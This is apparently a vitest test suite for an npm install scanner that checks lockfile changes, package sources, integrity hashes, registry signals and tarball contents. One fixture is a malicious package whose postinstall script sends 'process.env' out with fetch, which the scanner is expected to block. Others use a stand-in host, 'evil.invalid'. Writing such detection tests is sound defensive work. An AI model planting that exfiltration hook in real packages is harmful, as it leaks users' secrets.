import { createHash } from "node:crypto";
import { describe, expect, it } from "vitest";
import { planInstall, planInstallOnline } from "./scan.ts";
import { tar } from "./test-tar.ts";

const lock = (packages: Record<string, object>) =>
  JSON.stringify({
    lockfileVersion: 3,
    packages: { "": { name: "app" }, ...packages },
  });
const npm = (name: string, version: string) => ({
  version,
  resolved: `https://registry.npmjs.org/${name}/-/${name}-${version}.tgz`,
  integrity: "sha512-abc",
});
const before = lock({ "node_modules/a": npm("a", "1.0.0") });

describe("planInstall", () => {
  it("allows registry packages with integrity and no install scripts", () => {
    const outcome = planInstall(
      before,
      lock({
        "node_modules/a": npm("a", "1.0.0"),
        "node_modules/b": npm("b", "2.0.0"),
      }),
    );
    expect(outcome).toMatchObject({
      status: "complete",
      verdict: "allow",
      findings: [],
      added: 1,
      changed: 0,
    });
  });

  it("warns on a new package that runs install scripts, transitive ones included", () => {
    const outcome = planInstall(
      before,
      lock({
        "node_modules/a": npm("a", "1.0.0"),
        "node_modules/b/node_modules/c": {
          ...npm("c", "1.0.0"),
          hasInstallScript: true,
        },
      }),
    );
    expect(outcome).toMatchObject({ verdict: "warn" });
    expect(outcome.status === "complete" && outcome.findings[0]).toMatchObject({
      ruleId: "install/install-script",
      file: "c@1.0.0",
    });
  });

  it.each([
    ["git", "git+ssh://git@github.com/x/y.git#abc", "git"],
    ["a local path", "file:../evil", "local path"],
    ["another host", "https://evil.invalid/x.tgz", "evil.invalid"],
  ])("warns on a package from %s", (_name, resolved, text) => {
    const outcome = planInstall(
      undefined,
      lock({
        "node_modules/x": { version: "1.0.0", resolved, integrity: "sha512-x" },
      }),
    );
    expect(outcome.status === "complete" && outcome.findings[0]).toMatchObject({
      ruleId: "install/source",
      severity: "warn",
      message: expect.stringContaining(text),
    });
  });

  it("warns when a downloaded package has no integrity hash", () => {
    const { integrity: _, ...noHash } = npm("x", "1.0.0");
    const outcome = planInstall(undefined, lock({ "node_modules/x": noHash }));
    expect(outcome.status === "complete" && outcome.findings[0]?.ruleId).toBe(
      "install/integrity",
    );
  });

  it("only notes workspace links", () => {
    const outcome = planInstall(
      undefined,
      lock({ "node_modules/w": { resolved: "packages/w", link: true } }),
    );
    expect(outcome).toMatchObject({ verdict: "allow" });
    expect(outcome.status === "complete" && outcome.findings[0]?.severity).toBe(
      "info",
    );
  });

  it("reports the version change of an existing package", () => {
    const outcome = planInstall(
      before,
      lock({
        "node_modules/a": { ...npm("a", "1.1.0"), hasInstallScript: true },
      }),
    );
    expect(
      outcome.status === "complete" && outcome.findings[0]?.message,
    ).toContain("1.0.0 → 1.1.0");
  });

  it("is incomplete, never clean, when a lockfile cannot be read", () => {
    expect(planInstall(before, "{ nope")).toMatchObject({
      status: "incomplete",
      reason: expect.stringContaining("after"),
    });
  });
});

describe("planInstallOnline", () => {
  const now = new Date("2026-10-25T00:00:00Z");
  const doc = (
    name: string,
    versions: Record<string, object>,
    time: Record<string, string>,
  ) =>
    JSON.stringify({
      name,
      versions,
      time: { created: "2020-01-01T00:00:00Z", ...time },
    });
  const fakeFetch =
    (docs: Record<string, string | number>): typeof fetch =>
    async (input) => {
      const name = decodeURIComponent(String(input).split("/").pop() ?? "");
      const body = docs[name];
      if (typeof body === "number") return new Response("", { status: body });
      if (body === undefined) throw new Error(`unexpected ${name}`);
      return new Response(body, { status: 200 });
    };

  it("adds registry signals and fetches each package once", async () => {
    let calls = 0;
    const docs = {
      b: doc(
        "b",
        {
          "1.0.0": { _npmUser: { name: "x" } },
          "2.0.0": { _npmUser: { name: "mallory" } },
        },
        { "1.0.0": "2025-01-01T00:00:00Z", "2.0.0": "2026-10-24T00:00:00Z" },
      ),
    };
    const counting: typeof fetch = async (...args) => {
      calls++;
      return fakeFetch(docs)(...args);
    };
    const after = lock({
      "node_modules/a": npm("a", "1.0.0"),
      "node_modules/b": npm("b", "2.0.0"),
      "node_modules/x/node_modules/b": npm("b", "2.0.0"),
    });
    const outcome = await planInstallOnline(before, after, {
      fetch: counting,
      now,
      content: false,
    });
    expect(calls).toBe(1);
    expect(
      outcome.status === "complete" && outcome.findings.map((f) => f.ruleId),
    ).toEqual(["install/recent-release", "install/publisher"]);
  });

  it("is incomplete when the registry fails", async () => {
    const outcome = await planInstallOnline(
      undefined,
      lock({ "node_modules/b": npm("b", "1.0.0") }),
      { fetch: fakeFetch({ b: 503 }), now },
    );
    expect(outcome).toMatchObject({
      status: "incomplete",
      reason: expect.stringContaining("503"),
    });
  });

  it("does not query the registry for links or non-registry sources", async () => {
    const after = lock({
      "node_modules/w": { resolved: "packages/w", link: true },
      "node_modules/g": {
        version: "1.0.0",
        resolved: "git+https://x.invalid/g.git",
        integrity: "sha512-x",
      },
    });
    const outcome = await planInstallOnline(undefined, after, {
      fetch: fakeFetch({}),
      now,
    });
    expect(outcome.status).toBe("complete");
  });
});

describe("planInstallOnline: package contents", () => {
  const now = new Date("2026-10-25T00:00:00Z");
  const packument = JSON.stringify({
    name: "p",
    time: { created: "2020-01-01T00:00:00Z", "1.0.0": "2025-01-01T00:00:00Z" },
    versions: { "1.0.0": {} },
  });
  const tarball = (files: Record<string, string>) =>
    tar(
      Object.entries(files).map(([name, content]) => ({
        name: `package/${name}`,
        content,
      })),
    );
  const sri = (data: Buffer) =>
    `sha512-${createHash("sha512").update(data).digest("base64")}`;
  const serve =
    (tgz: Buffer): typeof fetch =>
    async (input) =>
      String(input).endsWith(".tgz")
        ? new Response(tgz, { status: 200 })
        : new Response(packument, { status: 200 });
  const planWith = (integrity: string) =>
    JSON.stringify({
      lockfileVersion: 3,
      packages: {
        "": {},
        "node_modules/p": {
          version: "1.0.0",
          resolved: "https://registry.npmjs.org/p/-/p-1.0.0.tgz",
          integrity,
        },
      },
    });

  it("inspects the downloaded package and blocks malicious contents", async () => {
    const tgz = tarball({
      "package.json": JSON.stringify({
        name: "p",
        scripts: { postinstall: "node s.js" },
      }),
      "s.js": "fetch(u, { body: JSON.stringify(process.env) });",
    });
    const outcome = await planInstallOnline(undefined, planWith(sri(tgz)), {
      fetch: serve(tgz),
      now,
    });
    expect(outcome).toMatchObject({ status: "complete", verdict: "block" });
    expect(
      outcome.status === "complete" &&
        outcome.findings.some((f) => f.file === "p@1.0.0/package.json"),
    ).toBe(true);
  });

  it("blocks a tarball that does not match the lockfile integrity", async () => {
    const tgz = tarball({ "package.json": "{}" });
    const outcome = await planInstallOnline(
      undefined,
      planWith(sri(Buffer.from("other"))),
      { fetch: serve(tgz), now },
    );
    expect(outcome.status === "complete" && outcome.findings[0]).toMatchObject({
      ruleId: "install/integrity",
      severity: "block",
    });
  });

  it("is incomplete when the plan exceeds the download budget", async () => {
    const tgz = tarball({ "package.json": "{}", "a.js": "x".repeat(5000) });
    const outcome = await planInstallOnline(undefined, planWith(sri(tgz)), {
      fetch: serve(tgz),
      now,
      maxDownloadBytes: 10,
    });
    expect(outcome).toMatchObject({
      status: "incomplete",
      reason: expect.stringContaining("bytes of tarballs"),
    });
  });
});
